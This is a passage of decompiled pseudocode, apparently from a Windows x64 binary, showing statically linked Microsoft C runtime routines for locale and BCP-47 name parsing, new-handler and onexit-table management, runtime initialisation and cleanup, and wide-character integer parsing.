    v9 = v8;
    if ( v8 == nullptr )
      return nullptr;
    v10 = v8 - v3;
    if ( v10 == 0 || *v8 == 59 )
      return nullptr;
    v11 = 1;
    v12 = &off_140091AA8;
    do
    {
      if ( (unsigned int)sub_140026080(*v12, v3, v10) == 0 )
      {
        v13 = -1;
        do
          ++v13;
        while ( (*v12)[v13] != 0 );
        if ( v10 == v13 )
          break;
      }
      ++v11;
      v12 += 3;
    }
    while ( (__int64)v12 <= (__int64)&off_140091B08 );
    v14 = v9 + 1;
    v15 = sub_140026020(v14, L";");
    v16 = v15;
    if ( v15 == 0 && *v14 != 59 )
      return nullptr;
    if ( v11 <= 5 )
    {
      if ( (unsigned int)sub_140022E30(v24, 131, v14, v15) != 0 )
        invoke_watson(nullptr, nullptr, nullptr, 0, 0);
      if ( (unsigned __int64)(2 * v16) >= 0x106 )
        _report_rangecheckfailure();
      v24[v16] = 0;
      if ( sub_14001AB34(v4, (unsigned int)v11, v24) != 0 )
        ++v7;
    }
    v17 = &v14[v16];
    if ( *v17 != 0 )
    {
      v3 = v17 + 1;
      if ( *v3 != 0 )
        continue;
    }
    goto LABEL_27;
  }
}


// ----- sub_14001AB34 @ 0x14001ab34 -----
__int64 __fastcall sub_14001AB34(int *a1, int a2, wchar_t *a3)
{
  __int64 v3; // r12
  __int64 v6; // r14
  unsigned __int16 *v7; // rcx
  __int64 v8; // r15
  __int64 result; // rax
  int v10; // r8d
  int v11; // edx
  __int64 v12; // rsi
  _DWORD *v13; // rax
  _DWORD *v14; // r13
  bool v15; // zf
  void *v16; // rax
  int v17; // r8d
  __int64 v18; // rdx
  __int64 v19; // rcx
  __int64 v20; // rax
  int StringTypeA; // eax
  unsigned int v22; // ecx
  WORD *v23; // rax
  int v24; // [rsp+40h] [rbp-C0h] BYREF
  int v25; // [rsp+44h] [rbp-BCh]
  void *v26; // [rsp+48h] [rbp-B8h]
  __int64 v27; // [rsp+50h] [rbp-B0h]
  _WORD v28[136]; // [rsp+60h] [rbp-A0h] BYREF
  _WORD v29[88]; // [rsp+170h] [rbp+70h] BYREF
  WORD Buf1[128]; // [rsp+220h] [rbp+120h] BYREF

  v3 = a2;
  v24 = 0;
  v6 = sub_14001C7D8() + 712;
  if ( expandlocale(a3, (__int64)v28, 131, (__int64)v29, 85, &v24) == 0 )
    return 0;
  v7 = v28;
  v8 = 8 * v3;
  result = *(_QWORD *)&a1[8 * v3 + 10];
  do
  {
    v10 = *(unsigned __int16 *)((char *)v7 + *(_QWORD *)&a1[8 * v3 + 10] - (_QWORD)v28);
    v11 = *v7 - v10;
    if ( v11 != 0 )
      break;
    ++v7;
  }
  while ( v10 != 0 );
  if ( v11 != 0 )
  {
    v12 = -1;
    do
      ++v12;
    while ( v28[v12] != 0 );
    v13 = malloc_base(2 * v12 + 6);
    v14 = v13;
    if ( v13 == nullptr )
      return 0;
    v26 = *(void **)&a1[v8 + 10];
    v27 = *(_QWORD *)&a1[2 * v3 + 74];
    v25 = a1[3];
    if ( (unsigned int)sub_140021B30(v13 + 1, v12 + 1, v28) != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    v15 = v28[0] == 67;
    *(_QWORD *)&a1[v8 + 10] = v14 + 1;
    if ( !v15 || v28[1] != 0 )
      v16 = _acrt_copy_locale_name(v29);
    else
      v16 = nullptr;
    *(_QWORD *)&a1[2 * v3 + 74] = v16;
    switch ( (_DWORD)v3 )
    {
      case 2:
        v17 = 0;
        a1[3] = v24;
        v18 = 0;
        v19 = *(_QWORD *)(v6 + 32);
        while ( a1[3] != *(_DWORD *)(v6 + 8 * v18) )
        {
          v20 = *(_QWORD *)(v6 + 8 * v18);
          ++v17;
          *(_QWORD *)(v6 + 8 * v18++) = v19;
          v19 = v20;
          if ( v18 >= 5 )
            goto LABEL_21;
        }
        if ( v17 != 0 )
        {
          *(_QWORD *)v6 = *(_QWORD *)(v6 + 8LL * v17);
          *(_QWORD *)(v6 + 8LL * v17) = v19;
        }
LABEL_21:
        if ( v17 == 5 )
        {
          StringTypeA = _acrt_GetStringTypeA(nullptr, 1u, Buf1, a1[3], 1);
          v22 = 0;
          if ( StringTypeA != 0 )
          {
            v23 = Buf1;
            do
            {
              ++v22;
              *v23++ &= 0x1FFu;
            }
            while ( v22 < 0x7F );
            v22 = memcmp(Buf1, Buf2, 0xFEu) == 0;
          }
          *(_DWORD *)(v6 + 4) = v22;
          *(_DWORD *)v6 = a1[3];
        }
        a1[7] = *(_DWORD *)(v6 + 4);
        break;
      case 1:
        a1[5] = v24;
        break;
      case 5:
        a1[6] = v24;
        break;
      default:
        break;
    }
    if ( ((unsigned int (__fastcall *)(int *))*(&funcs_14001AD92 + 3 * v3))(a1) != 0 )
    {
      *(_QWORD *)&a1[8 * v3 + 10] = v26;
      free_base(*(void **)&a1[2 * v3 + 74]);
      *(_QWORD *)&a1[2 * v3 + 74] = v27;
      free_base(v14);
      a1[3] = v25;
      return 0;
    }
    if ( v26 != &unk_14009ECB8
      && _InterlockedExchangeAdd(*(volatile signed __int32 **)&a1[8 * v3 + 14], 0xFFFFFFFF) == 1 )
    {
      free_base(*(void **)&a1[8 * v3 + 14]);
      free_base(*(void **)&a1[8 * v3 + 12]);
      free_base(*(void **)&a1[2 * v3 + 74]);
      *(_QWORD *)&a1[8 * v3 + 10] = 0;
      *(_QWORD *)&a1[2 * v3 + 74] = 0;
    }
    *v14 = 1;
    *(_QWORD *)&a1[8 * v3 + 14] = v14;
    return *(_QWORD *)&a1[8 * v3 + 10];
  }
  return result;
}


// ----- parse_bcp47 @ 0x14001ae9c -----
char __fastcall parse_bcp47(void *a1, unsigned __int16 *a2)
{
  char *v4; // r12
  unsigned __int64 v5; // rdi
  char v6; // si
  int i; // r15d
  __int64 v8; // rax
  unsigned __int16 *v9; // r14
  int v10; // eax
  unsigned __int64 v11; // rdi
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rdi
  char *v14; // rdx
  char v16[8]; // [rsp+20h] [rbp-49h] BYREF
  char v17; // [rsp+28h] [rbp-41h] BYREF
  _BYTE v18[24]; // [rsp+38h] [rbp-31h] BYREF
  _BYTE v19[24]; // [rsp+50h] [rbp-19h] BYREF
  char v20; // [rsp+68h] [rbp-1h] BYREF

  memset(a1, 0, 0x1CAu);
  v4 = &v17;
  v5 = 0;
  v6 = 1;
LABEL_2:
  while ( 2 )
  {
    for ( i = 0; ; i = 2 )
    {
      if ( v5 >= 4 )
        return 0;
      if ( i == 2 )
      {
        v8 = -1;
        do
          ++v8;
        while ( a2[v8] != 0 );
      }
      else
      {
        v8 = sub_140026020(a2, L"-_.");
      }
      *((_QWORD *)v4 - 1) = a2;
      ++v5;
      v9 = &a2[v8];
      *(_QWORD *)v4 = v8;
      v10 = *v9;
      a2 = v9 + 1;
      *((_DWORD *)v4 + 2) = i;
      v4 += 24;
      if ( v10 == 0 )
        goto LABEL_12;
      if ( v10 == 45 )
        goto LABEL_2;
      if ( v10 != 46 )
        break;
    }
    if ( v10 == 95 )
      continue;
    break;
  }
LABEL_12:
  v11 = v5 - 1;
  if ( v11 == 0 )
    return parse_bcp47_language(a1, v16);
  v12 = v11 - 1;
  if ( v12 == 0 )
  {
    if ( (unsigned __int8)parse_bcp47_language(a1, v16) != 0 )
    {
      if ( (unsigned __int8)parse_bcp47_script(a1, v18) != 0 || (unsigned __int8)parse_bcp47_region(a1, v18) != 0 )
        return v6;
      v14 = v18;
LABEL_31:
      if ( (unsigned __int8)parse_bcp47_code_page(a1, v14) != 0 )
        return v6;
    }
    return 0;
  }
  v13 = v12 - 1;
  if ( v13 == 0 )
  {
    if ( (unsigned __int8)parse_bcp47_language(a1, v16) == 0 )
      return 0;
    if ( (unsigned __int8)parse_bcp47_script(a1, v18) != 0
      && ((unsigned __int8)parse_bcp47_region(a1, v19) != 0 || (unsigned __int8)parse_bcp47_code_page(a1, v19) != 0) )
    {
      return v6;
    }
    if ( (unsigned __int8)parse_bcp47_region(a1, v18) == 0 )
      return 0;
    v14 = v19;
    goto LABEL_31;
  }
  if ( v13 == 1 )
  {
    if ( (unsigned __int8)parse_bcp47_language(a1, v16) == 0
      || (unsigned __int8)parse_bcp47_script(a1, v18) == 0
      || (unsigned __int8)parse_bcp47_region(a1, v19) == 0 )
    {
      return 0;
    }
    v14 = &v20;
    goto LABEL_31;
  }
  return 0;
}


// ----- parse_bcp47_code_page @ 0x14001b098 -----
char __fastcall parse_bcp47_code_page(__int64 a1, __int64 a2)
{
  if ( *(_DWORD *)(a2 + 16) != 2 )
    return 0;
  if ( (unsigned int)sub_140022E30(a1 + 256, 16, *(_QWORD *)a2, *(_QWORD *)(a2 + 8)) != 0 )
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  return 1;
}


// ----- parse_bcp47_language @ 0x14001b0e0 -----
char __fastcall parse_bcp47_language(__int64 a1, _QWORD *a2)
{
  if ( *((_DWORD *)a2 + 4) != 0 || (unsigned __int64)(a2[1] - 2LL) > 1 || (unsigned __int8)string_is_alpha(*a2) == 0 )
    return 0;
  if ( (unsigned int)sub_140022E30(a1, 64, *a2, a2[1]) != 0
    || (unsigned int)sub_140022E30(a1 + 288, 85, *a2, a2[1]) != 0 )
  {
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  return 1;
}


// ----- parse_bcp47_region @ 0x14001b16c -----
char __fastcall parse_bcp47_region(__int64 a1, _QWORD *a2)
{
  __int64 v4; // r14
  __int64 v5; // rdi
  __int64 v6; // rsi
  const unsigned __int16 *v7; // rax

  if ( *((_DWORD *)a2 + 4) != 0 )
    return 0;
  if ( a2[1] != 2 || (unsigned __int8)string_is_alpha(*a2) == 0 )
  {
    if ( a2[1] == 3 )
    {
      v4 = *a2;
      v5 = 0;
      while ( 1 )
      {
        v6 = *(unsigned __int16 *)(v4 + 2 * v5);
        v7 = _pctype_func();
        if ( (unsigned __int16)v6 > 0xFFu || (v7[v6] & 4) == 0 )
          break;
        if ( (unsigned __int64)++v5 >= 3 )
          goto LABEL_9;
      }
    }
    return 0;
  }
LABEL_9:
  if ( (unsigned int)sub_140022E30(a1 + 128, 64, *a2, a2[1]) != 0
    || (unsigned int)sub_140025EE0(a1 + 288, 85, &unk_14008FEF8, 1) != 0
    || (unsigned int)sub_140025EE0(a1 + 288, 85, *a2, a2[1]) != 0 )
  {
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  return 1;
}


// ----- parse_bcp47_script @ 0x14001b260 -----
char __fastcall parse_bcp47_script(__int64 a1, _QWORD *a2)
{
  if ( *((_DWORD *)a2 + 4) != 0 || a2[1] != 4 || (unsigned __int8)string_is_alpha(*a2) == 0 )
    return 0;
  if ( (unsigned int)sub_140025EE0(a1 + 288, 85, &unk_14008FEF8, 1) != 0
    || (unsigned int)sub_140025EE0(a1 + 288, 85, *a2, a2[1]) != 0 )
  {
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  return 1;
}


// ----- string_is_alpha @ 0x14001b2f0 -----
char __fastcall string_is_alpha(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rbx
  __int64 v5; // rsi
  const unsigned __int16 *v6; // rdx

  v2 = 0;
  if ( a2 == 0 )
    return 1;
  while ( 1 )
  {
    v5 = *(unsigned __int16 *)(a1 + 2 * v2);
    v6 = _pctype_func();
    if ( (unsigned __int16)v5 > 0xFFu || (v6[v5] & 0x103) == 0 )
      break;
    if ( ++v2 >= a2 )
      return 1;
  }
  return 0;
}


// ----- sub_14001B360 @ 0x14001b360 -----
__int64 sub_14001B360()
{
  return (unsigned int)dword_1400A0564;
}


// ----- _set_new_mode @ 0x14001b370 -----
int __cdecl set_new_mode(int NewMode)
{
  if ( (unsigned int)NewMode <= 1 )
    return _InterlockedExchange(&dword_1400A0564, NewMode);
  *(_DWORD *)sub_140018888() = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ----- sub_14001B39C @ 0x14001b39c -----
int *sub_14001B39C()
{
  return &dword_1400A0568;
}


// ----- sub_14001B3B0 @ 0x14001b3b0 -----
_PNH __fastcall sub_14001B3B0(__int64 a1)
{
  _PNH result; // rax
  unsigned int v3; // ebx

  result = query_new_handler();
  v3 = 0;
  if ( result != nullptr )
  {
    LOBYTE(v3) = ((unsigned int (__fastcall *)(__int64))result)(a1) != 0;
    return (_PNH)v3;
  }
  return result;
}


// ----- sub_14001B3F0 @ 0x14001b3f0 -----
void __fastcall sub_14001B3F0(__int64 a1)
{
  qword_1400A0570 = a1;
}


// ----- _query_new_handler @ 0x14001b400 -----
_PNH __cdecl query_new_handler()
{
  int (__cdecl *v0)(size_t); // rbx

  _vcrt_lock(0);
  v0 = (int (__cdecl *)(size_t))__ROR8__(_security_cookie ^ qword_1400A0570, _security_cookie & 0x3F);
  _vcrt_unlock(0);
  return v0;
}


// ----- _set_new_handler @ 0x14001b440 -----
_PNH __cdecl set_new_handler(_PNH NewHandler)
{
  int (__cdecl *v2)(size_t); // rbx

  _vcrt_lock(0);
  v2 = (int (__cdecl *)(size_t))__ROR8__(qword_1400A0570 ^ _security_cookie, _security_cookie & 0x3F);
  qword_1400A0570 = _security_cookie ^ __ROR8__(NewHandler, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  _vcrt_unlock(0);
  return v2;
}


// ----- sub_14001B4A0 @ 0x14001b4a0 -----
_PNH sub_14001B4A0()
{
  return set_new_handler((_PNH)_security_cookie);
}


// ----- ??$?RV_lambda_b8c45f8f788dd370798f47cfe8ac3a86_@@AEAV_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@V_lambda_332c3edc96d0294ec56c57d38c1cdfd5_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_b8c45f8f788dd370798f47cfe8ac3a86_@@AEAV_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@$$QEAV_lambda_332c3edc96d0294ec56c57d38c1cdfd5_@@@Z @ 0x14001b4ac -----
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_b8c45f8f788dd370798f47cfe8ac3a86_,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ &,_lambda_332c3edc96d0294ec56c57d38c1cdfd5_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  _vcrt_lock(*a2);
  LODWORD(a3) = sub_14001B524(a3);
  _vcrt_unlock(*a4);
  return (unsigned int)a3;
}


// ----- ??$?RV_lambda_b8c45f8f788dd370798f47cfe8ac3a86_@@AEAV_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@V_lambda_332c3edc96d0294ec56c57d38c1cdfd5_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_b8c45f8f788dd370798f47cfe8ac3a86_@@AEAV_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@$$QEAV_lambda_332c3edc96d0294ec56c57d38c1cdfd5_@@@Z_0 @ 0x14001b4e8 -----
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_b8c45f8f788dd370798f47cfe8ac3a86_,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ &,_lambda_332c3edc96d0294ec56c57d38c1cdfd5_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  _vcrt_lock(*a2);
  LODWORD(a3) = sub_14001B6D4(a3);
  _vcrt_unlock(*a4);
  return (unsigned int)a3;
}


// ----- sub_14001B524 @ 0x14001b524 -----
__int64 __fastcall sub_14001B524(_QWORD **a1)
{
  _QWORD *v2; // rdx
  uintptr_t v3; // r10
  _BYTE *v4; // rsi
  uintptr_t *v5; // r9
  char *v6; // rbx
  unsigned __int64 v7; // rbx
  __int64 v8; // rdi
  size_t v9; // rdi
  char *v10; // r14
  unsigned __int64 v11; // rcx

  v2 = (_QWORD *)**a1;
  if ( v2 != nullptr )
  {
    v3 = _security_cookie;
    v4 = (_BYTE *)__ROR8__(*v2 ^ _security_cookie, _security_cookie & 0x3F);
    v5 = (uintptr_t *)__ROR8__(v2[1] ^ _security_cookie, _security_cookie & 0x3F);
    v6 = (char *)__ROR8__(v2[2] ^ _security_cookie, _security_cookie & 0x3F);
    if ( v5 != (uintptr_t *)v6 )
    {
LABEL_14:
      *v5 = v3 ^ __ROR8__(*a1[1], 64 - ((unsigned __int8)v3 & 0x3Fu));
      *(_QWORD *)**a1 = _security_cookie ^ __ROR8__(v4, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
      *(_QWORD *)(**a1 + 8LL) = _security_cookie ^ __ROR8__(v5 + 1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
      *(_QWORD *)(**a1 + 16LL) = _security_cookie ^ __ROR8__(v6, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
      return 0;
    }
    v7 = (v6 - v4) >> 3;
    v8 = v7;
    if ( v7 > 0x200 )
      v8 = 512;
    v9 = v7 + v8;
    if ( v9 == 0 )
      v9 = 32;
    if ( v9 >= v7 && (v10 = (char *)recalloc_base(v4, v9, 8u), free_base(nullptr), v10 != nullptr)
      || (v9 = v7 + 4, v10 = (char *)recalloc_base(v4, v7 + 4, 8u), free_base(nullptr), v10 != nullptr) )
    {
      v3 = _security_cookie;
      v5 = (uintptr_t *)&v10[8 * v7];
      v6 = &v10[8 * v9];
      v4 = v10;
      v11 = (unsigned __int64)(v6 - (char *)v5 + 7) >> 3;
      if ( v5 > (uintptr_t *)v6 )
        v11 = 0;
      if ( v11 != 0 )
      {
        memset64(v5, _security_cookie, v11);
        v3 = _security_cookie;
      }
      goto LABEL_14;
    }
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_14001B6D4 @ 0x14001b6d4 -----
__int64 __fastcall sub_14001B6D4(_QWORD **a1)
{
  _QWORD *v2; // rdx
  uintptr_t v4; // r8
  uintptr_t *v5; // rdi
  uintptr_t *v6; // rbx
  uintptr_t v7; // r14
  char v8; // cl
  uintptr_t *v9; // r15
  uintptr_t *v10; // rbp
  uintptr_t v11; // rax
  _QWORD *v12; // rdx
  char *v13; // r9
  uintptr_t *v14; // rax

  v2 = (_QWORD *)**a1;
  if ( v2 == nullptr )
    return 0xFFFFFFFFLL;
  v4 = _security_cookie;
  v5 = (uintptr_t *)__ROR8__(*v2 ^ _security_cookie, _security_cookie & 0x3F);
  v6 = (uintptr_t *)__ROR8__(v2[1] ^ _security_cookie, _security_cookie & 0x3F);
  if ( (unsigned __int64)v5 - 1 <= 0xFFFFFFFFFFFFFFFDuLL )
  {
    v7 = _security_cookie;
    v8 = _security_cookie & 0x3F;
    v9 = v5;
    v10 = v6;
    while ( --v6 >= v5 )
    {
      v11 = *v6;
      if ( *v6 != v7 )
      {
        *v6 = v7;
        ((void (*)(void))__ROR8__(v4 ^ v11, v8))();
        v4 = _security_cookie;
        v8 = _security_cookie & 0x3F;
        v12 = (_QWORD *)**a1;
        v13 = (char *)__ROR8__(*v12 ^ _security_cookie, _security_cookie & 0x3F);
        v14 = (uintptr_t *)__ROR8__(v12[1] ^ _security_cookie, _security_cookie & 0x3F);
        if ( v13 != (char *)v9 || v14 != v10 )
        {
          v9 = (uintptr_t *)v13;
          v5 = (uintptr_t *)v13;
          v10 = v14;
          v6 = v14;
        }
      }
    }
    if ( v5 != (uintptr_t *)-1LL )
    {
      free_base(v5);
      v4 = _security_cookie;
    }
    *(_QWORD *)**a1 = v4;
    *(_QWORD *)(**a1 + 8LL) = v4;
    *(_QWORD *)(**a1 + 16LL) = v4;
  }
  return 0;
}


// ----- sub_14001B7EC @ 0x14001b7ec -----
int __fastcall sub_14001B7EC(_onexit_t Function)
{
  return register_onexit_function(&stru_1400A0578, Function);
}


// ----- _execute_onexit_table @ 0x14001b7fc -----
int __cdecl execute_onexit_table(_onexit_table_t *Table)
{
  int result; // eax
  __int64 v2; // rcx
  __int64 v3; // [rsp+0h] [rbp-38h] BYREF
  _QWORD v4[3]; // [rsp+20h] [rbp-18h] BYREF
  _onexit_table_t *v5; // [rsp+40h] [rbp+8h] BYREF
  __int64 v6; // [rsp+48h] [rbp+10h] BYREF
  int v7; // [rsp+50h] [rbp+18h] BYREF
  int v8; // [rsp+58h] [rbp+20h] BYREF

  v5 = Table;
  v4[1] = -2;
  v4[0] = &v5;
  v7 = 2;
  v8 = 2;
  __wind
  {
    result = __crt_seh_guarded_call<int>::operator()<_lambda_b8c45f8f788dd370798f47cfe8ac3a86_,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ &,_lambda_332c3edc96d0294ec56c57d38c1cdfd5_>(
               (__int64)&v6,
               &v8,
               (__int64)v4,
               &v7);
  }
  __unwind
  {
    sub_14001BA28(v2, &v3);
  }
  return result;
}


// ----- _initialize_onexit_table @ 0x14001b840 -----
int __cdecl initialize_onexit_table(_onexit_table_t *Table)
{
  _PVFV *v2; // rax

  if ( Table == nullptr )
    return -1;
  if ( Table->_first == Table->_end )
  {
    v2 = (_PVFV *)_security_cookie;
    Table->_first = (_PVFV *)_security_cookie;
    Table->_last = v2;
    Table->_end = v2;
  }
  return 0;
}


// ----- _register_onexit_function @ 0x14001b868 -----
int __cdecl register_onexit_function(_onexit_table_t *Table, _onexit_t Function)
{
  int v3; // [rsp+20h] [rbp-20h] BYREF
  _QWORD v4[3]; // [rsp+28h] [rbp-18h] BYREF
  _onexit_table_t *v5; // [rsp+50h] [rbp+10h] BYREF
  _onexit_t v6; // [rsp+58h] [rbp+18h] BYREF
  char v7; // [rsp+60h] [rbp+20h] BYREF
  int v8; // [rsp+68h] [rbp+28h] BYREF

  v6 = Function;
  v5 = Table;
  v4[0] = &v5;
  v4[1] = &v6;
  v8 = 2;
  v3 = 2;
  return __crt_seh_guarded_call<int>::operator()<_lambda_b8c45f8f788dd370798f47cfe8ac3a86_,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ &,_lambda_332c3edc96d0294ec56c57d38c1cdfd5_>(
           (__int64)&v7,
           &v3,
           (__int64)v4,
           &v8);
}


// ----- initialize_global_variables @ 0x14001b8b0 -----
char initialize_global_variables()
{
  qword_1400A05B0 = (__int64)&off_14009EB50;
  return 1;
}


// ----- initialize_c @ 0x14001b8c4 -----
char initialize_c()
{
  initialize_onexit_table(&stru_1400A0578);
  initialize_onexit_table(&Table);
  return 1;
}


// ----- uninitialize_environment @ 0x14001b8e8 -----
char uninitialize_environment()
{
  _dcrt_uninitialize_environments_nolock();
  return 1;
}


// ----- initialize_pointers @ 0x14001b8f8 -----
char initialize_pointers()
{
  uintptr_t v0; // rbx

  v0 = _security_cookie;
  sub_14001CCF0(_security_cookie);
  sub_14001B3F0(v0);
  _acrt_initialize_signal_handlers(v0);
  sub_140018DD0(v0);
  sub_140019844(v0);
  return 1;
}


// ----- sub_14001B938 @ 0x14001b938 -----
__vcrt_bool sub_14001B938()
{
  return _vcrt_uninitialize(false);
}


// ----- uninitialize_allocated_memory @ 0x14001b940 -----
char uninitialize_allocated_memory()
{
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)qword_1400A0BC0, 0xFFFFFFFF) == 1
    && qword_1400A0BC0 != (struct __crt_multibyte_data *)&unk_14009EFC0 )
  {
    free_base(qword_1400A0BC0);
    qword_1400A0BC0 = (struct __crt_multibyte_data *)&unk_14009EFC0;
  }
  return 1;
}


// ----- uninitialize_allocated_io_buffers @ 0x14001b980 -----
char uninitialize_allocated_io_buffers()
{
  free_base(qword_1400A0A88);
  qword_1400A0A88 = nullptr;
  free_base(qword_1400A0A90);
  qword_1400A0A90 = nullptr;
  free_base(qword_1400A0540);
  qword_1400A0540 = nullptr;
  free_base(qword_1400A0548);
  qword_1400A0548 = nullptr;
  return 1;
}


// ----- sub_14001B9DC @ 0x14001b9dc -----
__int64 sub_14001B9DC()
{
  return sub_140027AD8(&off_140091C00, &off_140091D00);
}


// ----- __acrt_uninitialize @ 0x14001b9f0 -----
__crt_bool __cdecl _acrt_uninitialize(__crt_bool Terminating)
{
  if ( !Terminating )
    return sub_140027B58(&off_140091C00, &off_140091D00);
  if ( Block != nullptr )
    flushall();
  return true;
}


// ----- sub_14001BA28 @ 0x14001ba28 -----
void __noreturn sub_14001BA28()
{
  void (*v0)(void); // rax

  v0 = *(void (**)(void))(sub_14001C7D8() + 24);
  if ( v0 != nullptr )
    v0();
  abort();
}


// ----- sub_14001BA50 @ 0x14001ba50 -----
__int64 __fastcall sub_14001BA50(_BYTE *a1, __int64 a2, __int64 a3)
{
  _BYTE *v3; // r9
  __int64 v5; // r8
  char v6; // al

  v3 = a1;
  if ( a1 == nullptr || a2 == 0 )
    goto LABEL_5;
  if ( a3 == 0 )
  {
    *a1 = 0;
LABEL_5:
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  v5 = a3 - (_QWORD)a1;
  while ( 1 )
  {
    v6 = a1[v5];
    *a1++ = v6;
    if ( v6 == 0 )
      break;
    if ( --a2 == 0 )
    {
      *v3 = 0;
      *(_DWORD *)sub_140018888() = 34;
      invalid_parameter_noinfo();
      return 34;
    }
  }
  return 0;
}


// ----- ??$parse_integer@_KV?$c_string_character_source@_W@__crt_strtox@@$00@__crt_strtox@@YA_KAEAV__crt_cached_ptd_host@@V?$c_string_character_source@_W@0@H_N@Z @ 0x14001bad0 -----
__int64 __fastcall __crt_strtox::parse_integer<unsigned __int64,__crt_strtox::c_string_character_source<wchar_t>,1>(
        __crt_cached_ptd_host *a1,
        wint_t **a2,
        unsigned int a3,
        char a4)
{
  wint_t *v4; // r12
  unsigned int v6; // r15d
  wint_t **v8; // rcx
  wint_t v9; // bx
  unsigned int v10; // ebp
  char v11; // al
  char v12; // si
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  unsigned int v16; // eax
  wint_t *v17; // rcx
  wint_t v18; // dx
  wint_t *v19; // r8
  int v20; // eax
  int v21; // eax
  unsigned int v22; // r9d
  unsigned int v23; // ecx
  int v24; // eax
  int v25; // ecx
  wint_t *v26; // r8
  unsigned int v27; // edx
  bool v28; // cl
  bool v29; // cf
  bool v30; // zf
  wint_t **v31; // rax
  __int64 result; // rax
  wint_t **v33; // rdx
  wint_t **v34; // rdx
  wint_t *v35; // [rsp+90h] [rbp-48h]

  v4 = *a2;
  v6 = a3;
  v35 = *a2;
  if ( *a2 == nullptr )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    goto LABEL_6;
  }
  if ( a3 != 0 && a3 - 2 > 0x22 )
  {
    *((_BYTE *)a1 + 48) = 1;
    *((_DWORD *)a1 + 11) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a1);
LABEL_6:
    v8 = (wint_t **)a2[1];
    if ( v8 != nullptr )
      *v8 = *a2;
    return 0;
  }
  v9 = *v4;
  *a2 = v4 + 1;
  v10 = 0;
  if ( *((_BYTE *)a1 + 40) == 0 )
    __crt_cached_ptd_host::update_locale_slow(a1);
  while ( iswctype(v9, 8u) != 0 )
    v9 = *(*a2)++;
  v11 = a4;
  v12 = a4 | 2;
  if ( v9 != 45 )
    v12 = v11;
  if ( ((v9 - 43) & 0xFFFD) == 0 )
    v9 = *(*a2)++;
  v13 = 48;
  if ( (v6 & 0xFFFFFFEF) != 0 )
    goto LABEL_79;
  if ( v9 >= 0x30u )
  {
    if ( v9 < 0x3Au )
    {
LABEL_19:
      v14 = v9 - v13;
      goto LABEL_60;
    }
    if ( v9 >= 0xFF10u )
    {
      if ( v9 < 0xFF1Au )
      {
        v14 = v9 - 65296;
LABEL_60:
        if ( v14 != -1 )
          goto LABEL_66;
      }
    }
    else if ( v9 >= 0x660u )
    {
      if ( v9 < 0x66Au )
      {
        v14 = v9 - 1632;
        goto LABEL_60;
      }
      if ( v9 >= 0x6F0u )
      {
        if ( v9 < 0x6FAu )
        {
          v14 = v9 - 1776;
          goto LABEL_60;
        }
        if ( v9 >= 0x966u )
        {
          if ( v9 < 0x970u )
          {
            v14 = v9 - 2406;
            goto LABEL_60;
          }
          if ( v9 >= 0x9E6u )
          {
            if ( v9 < 0x9F0u )
            {
              v14 = v9 - 2534;
              goto LABEL_60;
            }
            if ( v9 >= 0xA66u )
            {
              if ( v9 < 0xA70u )
              {
                v14 = v9 - 2662;
                goto LABEL_60;
              }
              v13 = 2790;
              if ( v9 >= 0xAE6u )
              {
                if ( v9 < 0xAF0u )
                  goto LABEL_19;
                v13 = 2918;
                if ( v9 >= 0xB66u )
                {
                  if ( v9 < 0xB70u )
                    goto LABEL_19;
                  v13 = 3174;
                  if ( v9 >= 0xC66u )
                  {
                    if ( v9 < 0xC70u )
                      goto LABEL_19;
                    v13 = 3302;
                    if ( v9 >= 0xCE6u )
                    {
                      if ( v9 < 0xCF0u )
                        goto LABEL_19;
                      v13 = 3430;
                      if ( v9 >= 0xD66u )
                      {
                        if ( v9 < 0xD70u )
                          goto LABEL_19;
                        v13 = 3664;
                        if ( v9 >= 0xE50u )
                        {
                          if ( v9 < 0xE5Au )
                            goto LABEL_19;
                          v13 = 3792;
                          if ( v9 >= 0xED0u )
                          {
                            if ( v9 < 0xEDAu )
                              goto LABEL_19;
                            v13 = 3872;
                            if ( v9 >= 0xF20u )
                            {
                              if ( v9 < 0xF2Au )
                                goto LABEL_19;
                              v13 = 4160;
                              if ( v9 >= 0x1040u )
                              {
                                if ( v9 < 0x104Au )
                                  goto LABEL_19;
                                v13 = 6112;
                                if ( v9 >= 0x17E0u )
                                {
                                  if ( v9 < 0x17EAu )
                                    goto LABEL_19;
                                  v13 = 6160;
                                  if ( (unsigned __int16)(v9 - 6160) <= 9u )
                                    goto LABEL_19;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  v15 = v9;
  v16 = v9 - 97;
  if ( (unsigned int)v9 - 65 > 0x19 && v16 > 0x19 )
    goto LABEL_75;
  if ( v16 <= 0x19 )
    v15 = v9 - 32;
